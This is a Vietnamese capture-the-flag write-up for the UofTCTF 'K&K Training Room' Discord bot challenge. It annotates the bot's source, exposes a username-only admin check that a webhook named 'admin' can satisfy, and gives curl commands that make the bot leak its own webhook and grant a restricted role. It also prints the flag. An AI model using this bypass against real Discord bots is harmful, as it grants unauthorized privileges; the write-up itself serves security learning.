---
title: UofTCTF - K&K Training Room

---

# UofTCTF - K&K Training Room

![image](https://hackmd.io/_uploads/BkKzAQWH-e.png)

Bài cho link server discord và file zip chứa source của con Bot trong server

Khi join server thì sẽ chỉ có duy nhất 1 kênh public và đoạn chat như con Bot gửi. Lưu ý kênh chat không cho soạn tin và chúng ta cũng chẳng có cái role gì cả

![image](https://hackmd.io/_uploads/HJO2RXZBbl.png)

3 file mà đề bài cho lần lượt là : 
- index.js
- package.json
- package-lock.json

Chúng ta chỉ cần tập trung vào `index.js`

```javascript=
const CONFIG = {
  ROLE_NAME: 'K&K',
  ADMIN_NAME: 'admin',
  WEBHOOK_NAME: 'K&K Announcer',
  TARGET_GUILD_ID: '1455821434927579198',
};
```
Đối tượng CONFIG này là đối tượng ta sẽ khai thác vào

Mình sẽ lấy luôn các đoạn code cần thiết của file index.js và comment bên cạnh cho dễ trace

```javascript=
const CONFIG = {
  ROLE_NAME: 'K&K',
  ADMIN_NAME: 'admin',
  WEBHOOK_NAME: 'K&K Announcer',
  TARGET_GUILD_ID: '1455821434927579198',
    //id này chính là id của server discord chall, bật dev mode trong discord, sau đó copy id của server chall ra đối chiếu là sẽ thấy
};

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

const isAdmin = (message) => message.author.username === CONFIG.ADMIN_NAME; 
// dòng này để check nếu mà tên người gửi tin nhắn bằng với 'admin' thì coi là isAdmin

client.on(Events.MessageCreate, async (message) => {
  if (message.content !== '!webhook') return;
    // nếu mà msg không phải là "!webhook" thì thoát bỏ hàm này
  if (!isAdmin(message)) {
    return message.reply(`Only \`${CONFIG.ADMIN_NAME}\` can set up the K&K announcer webhook.`);
  }// check bằng hàm isAdmin, nếu k trả về true thì return luôn

  const webhooks = await message.channel.fetchWebhooks();
  const existingWebhook = webhooks.find((w) => w.owner?.id === client.user.id); //check webhook đã tồn tại chưa, VÀ LƯU Ý là phải do con bot tạo ra chứ không phải do user tạo

  if (existingWebhook) {
    return message.reply('Announcer webhook already exists.');
  }

  try {
    const webhook = await message.channel.createWebhook({
      name: CONFIG.WEBHOOK_NAME,
    });//tạo webhook tại kênh hiện tại, tên là K&K Announcer(lấy từ đối tượng CONFIG)

    const embed = new EmbedBuilder()
      .setTitle('Announcer Webhook Created!') //thông báo đã tạo
      .setDescription(webhook.url) // lấy url của webhook vừa tạo
      .setFooter({ text: `“${randomQuote()}” — Gun` }) // thêm foooter random
      .setColor(0xe4bfc8); //màu

    await message.reply({ embeds: [embed] }); //in hết đống ở trên ra, đoạn này quan trọng vì chúng ta cần url webhook K&K Announcer vừa tạo
  } catch (err) {
    console.error('Webhook creation failed:', err);
    message.reply('Failed to create announcer webhook.');
  }
});



client.on(Events.InteractionCreate, async (interaction) => {// lắng nghe interact
  if (!interaction.isButton() || interaction.customId !== 'checkin') return; 
    // không phải button hoặc button không có id là 'checkin' thì return luôn

  const guild = client.guilds.cache.get(CONFIG.TARGET_GUILD_ID);
    //dòng này cần quan tâm, giá trị guild này là nó đang lấy 1 id chỉ định sẵn trong các server mà con bot được cài vào. và giá trị này chính là id của server chall
  if (!guild) {
    return interaction.reply({
      content: `Could not access guild (${CONFIG.TARGET_GUILD_ID}).`,
      flags: MessageFlags.Ephemeral,
    });
  }

  const role = guild.roles.cache.find(r => r.name === CONFIG.ROLE_NAME);
    //tại server chall, check xem server có role K&K hay không 
  if (!role) {
    return interaction.reply({
      content: `Role **${CONFIG.ROLE_NAME}** not found in **${guild.name}**.`,
      flags: MessageFlags.Ephemeral,
    });
  }// không có role K&K thì thoát

  let member; 
  try {
    member = await guild.members.fetch(interaction.user.id);
      //tronng server chall, nó sẽ tìm id của user vừa interact và gán vào biến member
  } catch {
    return interaction.reply({
      content: `You're not a member of **${guild.name}**.`,
      flags: MessageFlags.Ephemeral,
        // nếu không tìm thấy user trong server chall thì thông báo rồi thoát
    }); 
  }

  const alreadyHasRole = member.roles.cache.has(role.id);
    //check xem user đã có role K&K chưa
  if (!alreadyHasRole) {
    try {
      await member.roles.add(role);// chưa có thì cấp role
    } catch (err) {
      console.error('Role assignment failed:', err);
      return interaction.reply({
        content: 'Failed to assign role. Check bot permissions.',
        flags: MessageFlags.Ephemeral,
      });
    }
  }

  return interaction.reply({ // có role rồi thì thôi
    content: alreadyHasRole
      ? `You're already checked in at **${guild.name}**.`
      : `Checked in at **${guild.name}**! Assigned **${role.name}**.`,
    flags: MessageFlags.Ephemeral,
  });
});
```

Sau khi đã phân tích thì hướng đi sẽ đơn giản như sau : 
- cài con bot vào server riêng, để có thể chat được
- tại server đó, tạo 1 webhook tên admin để bypass. Lý do phải tạo webhook tên admin vì chỉ còn cách đó, việc đổi tên user thành admin chỉ là đổi nickname, username nó cần là tên đăng nhập
- sau đó lấy id con webhook tên 'admin' vừa tạo, viết lệnh để nó nhắn `!webhook`
- sau đó con bot check tin nhắn sẽ tạo ra webhook của nó là K&K Announcer trong chính server riêng và nó còn leak luôn url của K&K Announcer. Việc ta cần làm đó là sử dụng url đó, viết lệnh để tạo button checkin rồi click vào. Do webhook K&K Announcer của con bot tạo nên nó sẽ gửi interaction đến chính con bot, lấy id của chúng ta, sau đó tìm trong server chall và cấp role K&K
- lúc có role K&K sẽ mở 1 kênh private và lấy flag :>

---

Tạo webhook tên admin tại server riêng
![image](https://hackmd.io/_uploads/Sym2XDWBZg.png)

Lấy url của nó và thay vào lệnh sau 
```bash
curl -H "Content-Type: application/json" \
  -d '{"content":"!webhook"}' \
  "_url_"
```

Sau đó con bot sẽ tạo webhook và leak url
![image](https://hackmd.io/_uploads/BJAGNPWrZl.png)

Thay url đuợc leak vào lệnh sau để con webhook được bot tạo ra hiện button checkin
```bash 
curl -X POST "_url_" \
  -H "Content-Type: application/json" \
  -d '{
    "content":"K&K check-in",
    "components":[
      {"type":1,"components":[
        {"type":2,"style":1,"label":"Check in","custom_id":"checkin"}
      ]}
    ]
  }'
```
CLick vào button
![image](https://hackmd.io/_uploads/HJr0EwbHZl.png)

Lấy phờ lác
![image](https://hackmd.io/_uploads/HyW-BD-r-e.png)


FLAG : `uoftctf{tr41n_h4rd_w1n_345y_a625e2acd5ed}`
